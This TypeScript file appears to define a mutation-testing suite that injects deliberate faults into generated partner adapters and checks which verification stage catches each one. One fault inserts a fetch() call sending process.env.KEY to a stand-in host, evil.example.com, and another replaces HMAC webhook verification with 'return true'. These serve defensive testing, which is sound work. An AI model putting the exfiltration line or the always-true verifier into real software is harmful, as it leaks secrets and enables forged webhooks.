import { MappingSpec, MappingSpecSchema } from '@lattice/mapping-spec';
import { AdapterCompiler } from '@lattice/codegen';
import {
  VerificationPipeline,
  GoldenFixture,
  VerificationStageName,
  WebhookTestVector,
} from '@lattice/verify';

export interface FaultMutation {
  id: string;
  description: string;
  expectedCatchStage: VerificationStageName;
  mutateSpec?: (spec: MappingSpec) => MappingSpec;
  mutateCode?: (code: string) => string;
}

export interface MutationEvalReport {
  totalMutations: number;
  caughtMutations: number;
  catchRate: number; // 0.0 to 1.0
  results: Array<{
    id: string;
    description: string;
    expectedStage: VerificationStageName;
    actualFailedStage: VerificationStageName | null;
    caughtCorrectly: boolean;
  }>;
}

export class MutationTestingSuite {
  static readonly FAULT_CATALOGUE: FaultMutation[] = [
    {
      id: 'MUT_01_BROKEN_INTERFACE',
      description: 'Corrupts method signature on PartnerAdapter implementation',
      expectedCatchStage: 'TYPECHECK',
      mutateCode: (code) => code.replace('implements PartnerAdapter<Record<string, unknown>>', ''),
    },
    {
      id: 'MUT_02_MALICIOUS_EXFILTRATION',
      description: 'Injects unauthorized network fetch(process.env) call inside adapter',
      expectedCatchStage: 'AST_SCAN',
      mutateCode: (code) =>
        code.replace(
          'readonly provider =',
          'private leak = fetch("https://evil.example.com?k=" + process.env.KEY);\n  readonly provider ='
        ),
    },
    {
      id: 'MUT_03_SWAPPED_DATES',
      description: 'Swaps checkIn and checkOut source JSONPaths (passes round-trip if symmetric, caught by Golden)',
      expectedCatchStage: 'GOLDEN',
      mutateSpec: (spec) => {
        const clone: MappingSpec = JSON.parse(JSON.stringify(spec));
        const ci = clone.fields.find((f) => f.canonicalField === 'checkIn')!;
        const co = clone.fields.find((f) => f.canonicalField === 'checkOut')!;
        const tmp = ci.source.path;
        ci.source.path = co.source.path;
        co.source.path = tmp;
        return clone;
      },
    },
    {
      id: 'MUT_04_WRONG_MONEY_SCALE',
      description: 'Uses identity instead of centsToDecimal on integer cents field (100x overcharge)',
      expectedCatchStage: 'GOLDEN',
      mutateSpec: (spec) => {
        const clone: MappingSpec = JSON.parse(JSON.stringify(spec));
        const amt = clone.fields.find((f) => f.canonicalField === 'totalAmount')!;
        amt.transform = { kind: 'identity' };
        return clone;
      },
    },
    {
      id: 'MUT_05_INCOMPLETE_STATUS_ENUM',
      description: 'Omits cancellation enum value ("void") only present in held-out sample',
      expectedCatchStage: 'HELD_OUT',
      mutateSpec: (spec) => {
        const clone: MappingSpec = JSON.parse(JSON.stringify(spec));
        const st = clone.fields.find((f) => f.canonicalField === 'status')!;
        if (st.transform.kind === 'enumMap') {
          delete st.transform.map['void'];
        }
        return clone;
      },
    },
    {
      id: 'MUT_06_ASYMMETRIC_REVERSE_MAPPING',
      description: 'Breaks reverse mapping for guestName so round-trip property check fails',
      expectedCatchStage: 'PROPERTY',
      mutateSpec: (spec) => {
        const clone: MappingSpec = JSON.parse(JSON.stringify(spec));
        clone.reverse = clone.reverse.filter((r) => r.canonicalField !== 'unitId');
        return clone;
      },
    },
    {
      id: 'MUT_07_WRONG_WEBHOOK_HEADER',
      description: 'Configures wrong signature header name in webhook verifier',
      expectedCatchStage: 'WEBHOOK',
      mutateSpec: (spec) => {
        const clone: MappingSpec = JSON.parse(JSON.stringify(spec));
        clone.webhook.signatureHeader = 'x-wrong-signature-header';
        return clone;
      },
    },
    {
      id: 'MUT_08_WEBHOOK_ALWAYS_TRUE_BYPASS',
      description: 'Replaces cryptographic HMAC check with `return true` (forgery vulnerability)',
      expectedCatchStage: 'WEBHOOK',
      mutateCode: (code) =>
        code.replace(
          /verifyWebhook\([\s\S]*?\): boolean \{[\s\S]*?return crypto\.timingSafeEqual[\s\S]*?;\s*\}/,
          'verifyWebhook(headers: Record<string, string | string[] | undefined>, rawBody: Buffer, secret: string): boolean { return true; }'
        ),
    },
  ];

  static async runSuite(params: {
    baseSpec: MappingSpec;
    goldenFixtures: GoldenFixture[];
    heldOutFixtures: GoldenFixture[];
    webhookVector: WebhookTestVector;
  }): Promise<MutationEvalReport> {
    const results: MutationEvalReport['results'] = [];

    for (const fault of this.FAULT_CATALOGUE) {
      const targetSpec = fault.mutateSpec
        ? MappingSpecSchema.parse(fault.mutateSpec(params.baseSpec))
        : params.baseSpec;

      const compiled = await AdapterCompiler.compile(targetSpec);
      const targetCode = fault.mutateCode ? fault.mutateCode(compiled.adapterCode) : compiled.adapterCode;

      const report = VerificationPipeline.runAll({
        adapterFileName: compiled.adapterFileName,
        adapterCode: targetCode,
        spec: targetSpec,
        goldenFixtures: params.goldenFixtures,
        heldOutFixtures: params.heldOutFixtures,
        webhookVector: params.webhookVector,
      });

      const caughtCorrectly = !report.allPassed && report.failedStage === fault.expectedCatchStage;

      results.push({
        id: fault.id,
        description: fault.description,
        expectedStage: fault.expectedCatchStage,
        actualFailedStage: report.failedStage,
        caughtCorrectly,
      });
    }

    const caughtMutations = results.filter((r) => r.caughtCorrectly).length;

    return {
      totalMutations: results.length,
      caughtMutations,
      catchRate: Number((caughtMutations / results.length).toFixed(4)),
      results,
    };
  }
}